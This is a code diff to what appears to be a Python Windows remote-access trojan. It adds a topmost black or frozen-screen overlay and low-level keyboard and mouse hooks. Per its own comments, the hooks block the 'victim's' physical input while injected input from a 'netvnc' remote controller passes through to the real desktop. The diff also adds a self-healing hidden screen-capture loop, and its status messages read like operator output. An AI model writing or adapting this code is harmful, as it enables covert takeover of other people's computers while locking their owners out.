@@ -1017,11 +1017,18 @@ def _overlay_run(black: bool) -> None:
     if not u32.RegisterClassW(ctypes.byref(wc)):
         if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
             return
-    hwnd = u32.CreateWindowExW(0x8 | 0x80, cls, "", 0x80000000,  # WS_POPUP
+    # click-through: WS_EX_TRANSPARENT|WS_EX_LAYERED lets hit-testing fall
+    # through to the windows beneath, so netvnc's injected SendInput reaches
+    # the REAL desktop; physical victim input is blocked by the LL hook in
+    # _input_block_start() (injected events carry LLMHF/LLKHF_INJECTED and
+    # pass through it).
+    hwnd = u32.CreateWindowExW(0x8 | 0x80 | 0x20 | 0x80000, cls, "",
+                               0x80000000,               # WS_POPUP
                                0, 0, w, h, None, None, None, None)
     if not hwnd:
         return
     state["hwnd"] = hwnd
+    u32.SetLayeredWindowAttributes(hwnd, 0, 255, 2)   # LWA_ALPHA opaque
     u32.ShowWindow(hwnd, 5)               # SW_SHOW
     u32.SetWindowPos(hwnd, -1, 0, 0, w, h, 0x0040)   # HWND_TOPMOST-ish
     m = MSG()
@@ -1029,6 +1036,84 @@ def _overlay_run(black: bool) -> None:
         u32.TranslateMessage(ctypes.byref(m))
         u32.DispatchMessageW(ctypes.byref(m))
     state["hwnd"] = None
+
+
+def _input_block_start():
+    """Block PHYSICAL keyboard/mouse while the overlay is up (no admin
+    needed). Injected input (SendInput, e.g. netvnc remote control) sets
+    LLMHF_INJECTED / LLKHF_INJECTED and passes straight through."""
+    if os.name != "nt":
+        return
+    import ctypes
+    from ctypes import wintypes
+    u32 = ctypes.windll.user32
+    k32 = ctypes.windll.kernel32
+
+    class KBDLLHOOKSTRUCT(ctypes.Structure):
+        _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
+                    ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
+                    ("dwExtraInfo", ctypes.c_size_t)]
+
+    class MSLLHOOKSTRUCT(ctypes.Structure):
+        _fields_ = [("pt", wintypes.POINT), ("mouseData", wintypes.DWORD),
+                    ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
+                    ("dwExtraInfo", ctypes.c_size_t)]
+
+    class MSG(ctypes.Structure):
+        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
+                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
+                    ("time", ctypes.c_uint), ("pt", wintypes.POINT)]
+
+    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
+                                  wintypes.WPARAM, wintypes.LPARAM)
+    INJECTED = 0x10
+
+    def kb_proc(code, wp, lp):
+        if code >= 0:
+            st = ctypes.cast(lp, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+            if not (st.flags & INJECTED):
+                return 1
+        return u32.CallNextHookEx(None, code, wp, lp)
+
+    def ms_proc(code, wp, lp):
+        if code >= 0:
+            st = ctypes.cast(lp, ctypes.POINTER(MSLLHOOKSTRUCT)).contents
+            if not (st.flags & INJECTED):
+                return 1
+        return u32.CallNextHookEx(None, code, wp, lp)
+
+    kb_cb, ms_cb = HOOKPROC(kb_proc), HOOKPROC(ms_proc)
+    _ov_state["hook_cbs"] = (kb_cb, ms_cb)   # keep trampolines alive
+
+    def pump():
+        kb = u32.SetWindowsHookExW(13, kb_cb, None, 0)   # WH_KEYBOARD_LL
+        ms = u32.SetWindowsHookExW(14, ms_cb, None, 0)   # WH_MOUSE_LL
+        _ov_state["hooks"] = (kb, ms)
+        m = MSG()
+        while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
+            pass
+        for hh in (kb, ms):
+            if hh:
+                u32.UnhookWindowsHookEx(hh)
+        _ov_state["hooks"] = None
+
+    th = threading.Thread(target=pump, daemon=True, name="ovblock")
+    _ov_state["hook_thread"] = th
+    th.start()
+
+
+def _input_block_stop():
+    if os.name != "nt":
+        return
+    import ctypes
+    t = _ov_state.get("hook_thread")
+    if t and t.is_alive():
+        if t.ident:
+            ctypes.windll.user32.PostThreadMessageW(t.ident, 0x0012, 0, 0)
+        t.join(timeout=3)
+    _ov_state["hook_thread"] = None
+    _ov_state["hooks"] = None
+    _ov_state["hook_cbs"] = None
 
 
 def _overlay_on(black: bool = False) -> str:
@@ -1052,8 +1137,9 @@ def _overlay_on(black: bool = False) -> str:
         time.sleep(0.05)
     if _ov_state["hwnd"]:
         _ov_state["black"] = black
+        _input_block_start()
         kind = "solid black" if black else "screen frozen"
-        return "[+] overlay on (%s, input swallowed, cursor hidden)" % kind
+        return "[+] overlay on (%s, physical input blocked, remote control live)" % kind
     return "[!] overlay failed to create window"
 
 
@@ -1067,6 +1153,7 @@ def _overlay_off() -> str:
         ctypes.windll.user32.PostMessageW(hwnd, 0x10, 0, 0)   # WM_CLOSE
     if t:
         t.join(timeout=5)
+    _input_block_stop()
     _ov_state["bits"] = None
     return "[+] overlay off (screen live again)"
 
@@ -1221,6 +1308,12 @@ def _under_server_main():
         u32.GetClassNameW(h, t, 64)
         if t.value.startswith("nvo"):  # our overlay window(s) - excluded by design
             return False
+        # viewer feedback loop: a browser showing the netvnc viewer page on
+        # this same desktop would recurse into the stream (infinite mirror)
+        tt = ctypes.create_unicode_buffer(256)
+        u32.GetWindowTextW(h, tt, 256)
+        if "netvnc viewer" in tt.value.lower():
+            return False
         return True
 
     CB = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
@@ -1302,6 +1395,25 @@ def _under_server_main():
                     conns.append(h)
 
     def capture_loop():
+        nonlocal W, H, frame_len, frame_buf
+        # THIS thread does all drawing/measuring: new threads inherit the
+        # PROCESS dpi context, not the creating thread's, so re-apply
+        # per-monitor awareness here. Otherwise GetWindowRect/GetDC are
+        # virtualized while W,H (measured above) are physical -> windows
+        # drawn small into the top-left of an oversized bitmap, black around
+        # (the "stream not filling the frame" bug).
+        u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))
+        W2, H2 = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
+        if (W2, H2) != (W, H):
+            W, H = W2, H2
+            _under_srv["w"], _under_srv["h"] = W, H
+            try:
+                with open(_under_meta_path(), "w") as fh:
+                    fh.write('{"w": %d, "h": %d}' % (W, H))
+            except Exception:
+                pass
+        frame_len = W * H * 4
+        frame_buf = ctypes.create_string_buffer(frame_len)
         mem, bmp, bmi = new_bgra(W, H)
         dc_cache = {}
         visible = []          # (hwnd, rect, visible_rgn) top->bottom
@@ -1310,6 +1422,32 @@ def _under_server_main():
         while _under_srv["run"]:
             t0 = time.perf_counter()
             if t0 >= cull_at:
+                # geometry self-heal: resolution/monitor changes after startup
+                # would leave windows drawn into a stale-size bitmap (content
+                # top-left, rest black). Re-measure and rebuild everything,
+                # then republish under.json so the streamer restarts with the
+                # matching -s.
+                W2, H2 = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
+                if (W2, H2) != (W, H):
+                    W, H = W2, H2
+                    _under_srv["w"], _under_srv["h"] = W, H
+                    frame_len = W * H * 4
+                    frame_buf = ctypes.create_string_buffer(frame_len)
+                    g32.DeleteObject(bmp)
+                    g32.DeleteDC(mem)
+                    mem, bmp, bmi = new_bgra(W, H)
+                    for _stale in list(dc_cache):
+                        _wmem, _wbmp, _wbmi = dc_cache.pop(_stale)
+                        g32.DeleteObject(_wbmp)
+                        g32.DeleteDC(_wmem)
+                    for _, _, _rgn in visible:
+                        g32.DeleteObject(_rgn)
+                    visible = []
+                    try:
+                        with open(_under_meta_path(), "w") as fh:
+                            fh.write('{"w": %d, "h": %d}' % (W, H))
+                    except Exception:
+                        pass
                 # occlusion culling: visible region = rect minus union of
                 # everything above it in z-order
                 order = []
